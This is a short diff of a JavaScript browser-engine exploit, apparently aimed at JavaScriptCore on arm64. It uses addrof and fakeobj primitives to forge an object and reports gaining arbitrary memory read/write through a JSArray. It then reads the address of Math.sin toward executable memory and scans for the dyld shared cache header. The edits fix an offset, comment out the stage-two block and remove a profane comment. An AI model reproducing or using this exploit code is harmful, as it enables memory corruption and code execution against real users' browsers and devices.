@@ -504,7 +504,7 @@ for (var i = 0; i < 1000; ++i) {
 
     print("outer @ " + addrof(container));
 
-    var hax = fakeobj(Add(addrof(container),0x10));
+    var hax = fakeobj(Add(addrof(container),new Int64("0x10")));
     print("we have hax object ;)");
     print("after further work we can use this object for arbitrary r/w");
     print("now lets steal a real JSCellHeader")
@@ -629,7 +629,7 @@ for (var i = 0; i < 1000; ++i) {
         },
     };
     print("we have arbitrary r/w with JSArray :)");
-    memory = stage2;
+   /* memory = stage2;
 	var sinFuncAddr = memory.addrof(Math.sin);
         
         var executableAddr = memory.read64(sinFuncAddr,3);
@@ -645,7 +645,6 @@ for (var i = 0; i < 1000; ++i) {
 	print('JSC header @' + jsc); //dyld_cache_header
         while(true)
         {
-        /*FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...*/
         if(strcmp(memory.read(jsc, 0x10), "dyld_v1   arm64")) //cache header magic
         //webcore header magic...
         {
@@ -653,7 +652,7 @@ for (var i = 0; i < 1000; ++i) {
             break;
         }
         jsc = Sub(jsc, 0x1000);
-        }
+        }*/
 	      
 	
 
